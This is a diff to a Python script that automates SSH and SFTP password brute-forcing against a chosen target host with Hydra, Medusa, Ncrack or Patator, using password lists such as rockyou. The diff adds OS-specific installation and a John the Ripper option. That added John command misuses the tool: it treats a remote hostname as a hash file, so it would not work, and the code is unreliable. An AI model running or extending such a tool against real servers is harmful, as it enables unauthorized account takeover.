@@ -10,6 +10,7 @@ import os
 import subprocess
 from multiprocessing import Pool, cpu_count
 from itertools import cycle
+import platform
 
 # Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -76,23 +77,44 @@ def download_wordlist(wordlist_url):
 def command_exists(command):
     return subprocess.call(f"type {command}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0
 
-# Function to install dependencies
+# Function to install dependencies based on OS
 def install_dependencies():
-    if os.name == 'nt':  # Windows
+    os_system = platform.system()
+    
+    if os_system == 'Windows':
         logging.info("Please manually install the required tools on Windows.")
-    else:  # Unix-based
+    elif os_system == 'Linux':
         if not command_exists('hydra'):
             logging.info("Installing Hydra...")
-            subprocess.call("sudo apt-get install -y hydra" if command_exists("apt-get") else "brew install hydra", shell=True)
+            subprocess.call("sudo apt-get install -y hydra", shell=True)
         if not command_exists('medusa'):
             logging.info("Installing Medusa...")
-            subprocess.call("sudo apt-get install -y medusa" if command_exists("apt-get") else "brew install medusa", shell=True)
+            subprocess.call("sudo apt-get install -y medusa", shell=True)
         if not command_exists('ncrack'):
             logging.info("Installing Ncrack...")
-            subprocess.call("sudo apt-get install -y ncrack" if command_exists("apt-get") else "brew install ncrack", shell=True)
+            subprocess.call("sudo apt-get install -y ncrack", shell=True)
         if not command_exists('patator'):
             logging.info("Installing Patator...")
-            subprocess.call("sudo apt-get install -y patator" if command_exists("apt-get") else "brew install patator", shell=True)
+            subprocess.call("sudo apt-get install -y patator", shell=True)
+        if not command_exists('john'):
+            logging.info("Installing John the Ripper...")
+            subprocess.call("sudo apt-get install -y john", shell=True)
+    elif os_system == 'Darwin':  # macOS
+        if not command_exists('hydra'):
+            logging.info("Installing Hydra...")
+            subprocess.call("brew install hydra", shell=True)
+        if not command_exists('medusa'):
+            logging.info("Installing Medusa...")
+            subprocess.call("brew install medusa", shell=True)
+        if not command_exists('ncrack'):
+            logging.info("Installing Ncrack...")
+            subprocess.call("brew install ncrack", shell=True)
+        if not command_exists('patator'):
+            logging.info("Installing Patator...")
+            subprocess.call("brew install patator", shell=True)
+        if not command_exists('john'):
+            logging.info("Installing John the Ripper...")
+            subprocess.call("brew install john", shell=True)
 
 # Main function
 def main(target, delay, username_wordlist, password_wordlist, bruteforcer):
@@ -148,6 +170,8 @@ def main(target, delay, username_wordlist, password_wordlist, bruteforcer):
             os.system(f"ncrack -p 22 -U {username_file} -P {password_file} {target}")
         elif bruteforcer == "patator":
             os.system(f"patator sftp_login host={target} user=FILE0 0={username_file} password=FILE1 1={password_file}")
+        elif bruteforcer == "john":
+            os.system(f"john --wordlist={password_file} --users={username_file} --format=ssh {target}")
 
     except KeyboardInterrupt:
         logging.info("Script interrupted by user")
@@ -165,7 +189,7 @@ if __name__ == "__main__":
         'SecLists-passwords', 'jeanphorn-passwords', 'kkrypt0nn-passwords', 'rockyou-passwords'
     ], help='Select password wordlist source')
     parser.add_argument('-b', '--bruteforcer', required=True, choices=[
-        'hydra', 'medusa', 'ncrack', 'patator'
+        'hydra', 'medusa', 'ncrack', 'patator', 'john'
     ], help='Select brute-forcing tool')
     args = parser.parse_args()
 
